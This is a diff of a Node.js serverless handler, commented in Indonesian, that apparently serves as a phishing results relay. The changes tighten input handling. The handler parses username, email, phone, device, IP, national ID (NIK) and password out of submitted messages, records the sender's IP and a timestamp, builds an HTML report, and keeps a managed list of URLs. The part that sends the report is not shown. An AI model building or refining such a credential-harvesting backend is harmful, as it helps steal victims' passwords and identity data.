@@ -23,7 +23,7 @@ function saveUrls(data) {
 }
 
 // ======================
-// PARSE BODY SAFE
+// PARSE BODY
 // ======================
 function parseBody(req) {
   if (!req.body) return {};
@@ -34,29 +34,42 @@ function parseBody(req) {
 }
 
 // ======================
-// STRIP HTML TOTAL
+// DETECT HTML (BLOCK TOTAL)
 // ======================
-function stripHtml(str = "") {
-  return String(str)
-    .replace(/<[^>]*>/g, "")
-    .replace(/\$/g, "")
-    .trim();
+function isHtml(input = "") {
+  return /<[^>]+>/.test(input);
 }
 
 // ======================
-// EXTRACT VARIABLES FROM RAW INPUT (HTML/TEKS CAMPUR)
+// STRICT KEY:VALUE PARSER
 // ======================
 function extractVars(input = "") {
   const text = String(input);
 
-  return {
-    email: (text.match(/email[:=]\s*([^\s<]+)/i)?.[1]) || "",
-    password: (text.match(/password[:=]\s*([^\s<]+)/i)?.[1]) || "",
-    ip: (text.match(/ip[:=]\s*([0-9a-fA-F:.]+)/i)?.[1]) || "",
-    user: (text.match(/user[:=]\s*([^\s<]+)/i)?.[1]) || "",
-    phone: (text.match(/phone[:=]\s*([^\s<]+)/i)?.[1]) || "",
-    device: (text.match(/device[:=]\s*([^\s<]+)/i)?.[1]) || ""
+  const get = (key) => {
+    const match = text.match(new RegExp(`${key}\\s*[:=]\\s*([^\\n]+)`, "i"));
+    return match ? match[1].trim() : "";
   };
+
+  return {
+    user: get("user"),
+    email: get("email"),
+    phone: get("phone"),
+    ip: get("ip"),
+    device: get("device"),
+    nik: get("nik"),
+    password: get("password")
+  };
+}
+
+// ======================
+// STRIP SAFE TEXT
+// ======================
+function clean(str = "") {
+  return String(str)
+    .replace(/<[^>]*>/g, "") // remove html
+    .replace(/\$/g, "")      // remove $
+    .trim();
 }
 
 // ======================
@@ -82,12 +95,6 @@ function buildHtml(vars) {
 <tr><td><b>Time</b></td><td>${vars.time}</td></tr>
 </table>
 
-<br>
-
-<div style="background:#111827;padding:15px;border-radius:10px">
-${vars.message}
-</div>
-
 </body>
 </html>
 `;
@@ -111,12 +118,10 @@ module.exports = async (req, res) => {
     const action = body.action || "send";
 
     // ======================
-    // ADD URL
+    // URL MANAGEMENT
     // ======================
     if (action === "add-url") {
-      if (!body.url) {
-        return res.json({ success: false, message: "URL wajib" });
-      }
+      if (!body.url) return res.json({ success: false, message: "URL kosong" });
 
       if (!urls.includes(body.url)) {
         urls.push(body.url);
@@ -126,18 +131,12 @@ module.exports = async (req, res) => {
       return res.json({ success: true, urls });
     }
 
-    // ======================
-    // DELETE URL
-    // ======================
     if (action === "delete-url") {
       urls = urls.filter(x => x !== body.url);
       saveUrls(urls);
       return res.json({ success: true, urls });
     }
 
-    // ======================
-    // LIST URL
-    // ======================
     if (action === "list-url") {
       return res.json({ success: true, urls });
     }
@@ -145,52 +144,45 @@ module.exports = async (req, res) => {
     // ======================
     // INPUT
     // ======================
-    const rawSubjek = body.subjek || "";
-    const rawSender = body.sender || "system";
-    const rawMessage = body.message || body.pesan || "";
+    const subjekRaw = body.subjek || "";
+    const messageRaw = body.message || body.pesan || "";
+    const sender = clean(body.sender || "system");
 
     // ======================
-    // CLEAN INPUT
+    // BLOCK HTML INPUT (FIX UTAMA)
     // ======================
-    const subjek = stripHtml(rawSubjek);
-    const sender = stripHtml(rawSender);
-    const message = stripHtml(rawMessage);
-
-    if (!subjek) {
+    if (isHtml(messageRaw) || isHtml(subjekRaw)) {
       return res.status(400).json({
         success: false,
-        message: "subjek wajib diisi"
+        message: "HTML tidak diizinkan, gunakan format key:value saja"
+      });
+    }
+
+    const subjek = clean(subjekRaw);
+
+    if (!subjek || !messageRaw) {
+      return res.status(400).json({
+        success: false,
+        message: "subjek & message wajib diisi"
       });
     }
 
     // ======================
-    // EXTRACT VARIABLES (DARI INPUT KOTOR)
+    // EXTRACT VARIABLES
     // ======================
-    const extracted = extractVars(rawMessage);
+    const vars = extractVars(messageRaw);
+
+    vars.time = new Date().toISOString();
+
+    // fallback IP
+    vars.ip =
+      vars.ip ||
+      req.headers["x-forwarded-for"] ||
+      req.socket?.remoteAddress ||
+      "unknown";
 
     // ======================
-    // AUTO VARIABLES
-    // ======================
-    const vars = {
-      subjek,
-      sender,
-      ip:
-        req.headers["x-forwarded-for"] ||
-        req.socket?.remoteAddress ||
-        "unknown",
-      time: new Date().toISOString(),
-      message,
-
-      // hasil extract dari HTML/text
-      user: extracted.user,
-      email: extracted.email,
-      password: extracted.password,
-      phone: extracted.phone,
-      device: extracted.device
-    };
-
-    // ======================
-    // BUILD HTML ONLY FROM BACKEND
+    // GENERATE HTML ONLY FROM BACKEND
     // ======================
     const html = buildHtml(vars);
 
